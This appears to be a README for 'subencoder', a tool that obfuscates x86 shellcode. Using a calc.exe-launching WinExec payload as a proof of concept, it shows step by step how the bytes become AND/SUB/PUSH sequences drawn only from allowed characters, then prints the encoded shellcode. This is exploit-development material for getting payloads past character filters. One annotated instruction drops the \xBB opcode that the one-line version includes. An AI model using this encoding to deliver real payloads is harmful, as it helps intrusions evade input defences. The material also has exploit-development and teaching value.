# subencoder  
subencoder - shellcode obfuscater  
  
Calc.exe Shellcode:  
  
"\x33\xc0".....................XOR EAX,EAX | Zero out EAX register  
"\x50".........................PUSH EAX | Push EAX to have null-byte padding for "calc.exe"  
"\x68\x2E\x65\x78\x65".........PUSH ".exe"  
"\x68\x63\x61\x6C\x63".........PUSH "calc" 
"\x8B\xC4".....................MOV EAX,ESP | Put a pointer to the ASCII string in EAX 
"\x6A\x01".....................PUSH 1 | Push uCmdShow parameter to the stack 
"\x50".........................PUSH EAX | Push the pointer to lpCmdLine to the stack 
"\x85\x6a\xe9\x77".............MOV EBX, 77e96a85 | Move the pointer to WinExec() into EBX 
"\xFF\xD3".....................CALL EBX | Call WinExec()

In one line:  
\x33\xc0\x50\x68\x2E\x65\x78\x65\x68\x63\x61\x6C\x63\x8B\xC4\x6A\x01\x50\xBB\x85\x6a\xe9\x77\xFF\xD3  

Group it int groups of 4 bytes  
33c05068  
2E657865  
6863616C  
638BC46A  
0150BB85  
6AE977FF  
D3  

Revert it and 0 pad:  
D3		    -> 000000D3  
6AE977FF  -> FF77E96A  
0150BB85  -> 8BBB5001  
638BC46A  -> 6AC48B63  
6863616C  -> 6C616368  
2E657865  -> 6578652E  
33c05068  -> 6850C033  
  
ShellCode 4 byte reversed in one line:  
000000D3FF77E96A8BBB50016AC48B636C6163686578652E6850C033  
  
Allowed Char File (2-digit hex):  
02030405060708090b0c0e0f101112131415161718191a1b1c1d1e1f202122232425262728292a2b2c2d2e303132333435363738393b3c3d3e4142434445464748494a4b4c4d4e4f505152535455565758595a5b5c5d5e5f606162636465666768696a6b6c6d6e6f707172737475767778797a7b7c7d7e7f  

Generate shellcode:  
$ ./subencoder shellcode.txt allowedchars.txt  
Address: 0x000000D3  
-------------------  
AND EAX,554E4D4A  
AND EAX,2A313235  
SUB EAX, 0x74747414  
SUB EAX, 0x75757503  
Result:   
\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x14\x74\x74\x74\x2D\x03\x75\x75\x75\x50  

Address: 0xFF77E96A  
-------------------  
AND EAX,554E4D4A  
AND EAX,2A313235  
SUB EAX, 0x04040404  
SUB EAX, 0x7e280428  
SUB EAX, 0x7e5c0e6a  
Result:   
\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x04\x04\x04\x04\x2D\x28\x04\x28\x7e\x2D\x6a\x0e\x5c\x7e\x50  

Address: 0x8BBB5001  
-------------------  
AND EAX,554E4D4A  
AND EAX,2A313235  
SUB EAX, 0x48747474  
SUB EAX, 0x0f740f74  
SUB EAX, 0x1c5c2c17  
Result:   
\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x74\x74\x74\x48\x2D\x74\x0f\x74\x0f\x2D\x17\x2c\x5c\x1c\x50  
  
Address: 0x6AC48B63  
-------------------  
AND EAX,554E4D4A  
AND EAX,2A313235  
SUB EAX, 0x3e0e3e3e  
SUB EAX, 0x572d365f  
Result:   
\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x3e\x3e\x0e\x3e\x2D\x5f\x36\x2d\x57\x50  

Address: 0x6C616368  
-------------------  
AND EAX,554E4D4A  
AND EAX,2A313235  
SUB EAX, 0x31313131  
SUB EAX, 0x626d6b67  
Result:  
\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x31\x31\x31\x31\x2D\x67\x6b\x6d\x62\x50  

Address: 0x6578652E  
-------------------  
AND EAX,554E4D4A  
AND EAX,2A313235  
SUB EAX, 0x2d2d2d79  
SUB EAX, 0x6d5a6d59  
Result:  
\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x79\x2d\x2d\x2d\x2D\x59\x6d\x5a\x6d\x50  

Address: 0x6850C033  
-------------------  
AND EAX,554E4D4A  
AND EAX,2A313235  
SUB EAX, 0x204b206f  
SUB EAX, 0x77641f5e  
Result:  
\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x6f\x20\x4b\x20\x2D\x5e\x1f\x64\x77\x50  

$ cat output.txt  
\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x14\x74\x74\x74\x2D\x03\x75\x75\x75\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x04\x04\x04\x04\x2D\x28\x04\x28\x7e\x2D\x6a\x0e\x5c\x7e\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x74\x74\x74\x48\x2D\x74\x0f\x74\x0f\x2D\x17\x2c\x5c\x1c\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x3e\x3e\x0e\x3e\x2D\x5f\x36\x2d\x57\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x31\x31\x31\x31\x2D\x67\x6b\x6d\x62\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x79\x2d\x2d\x2d\x2D\x59\x6d\x5a\x6d\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x6f\x20\x4b\x20\x2D\x5e\x1f\x64\x77\x50  


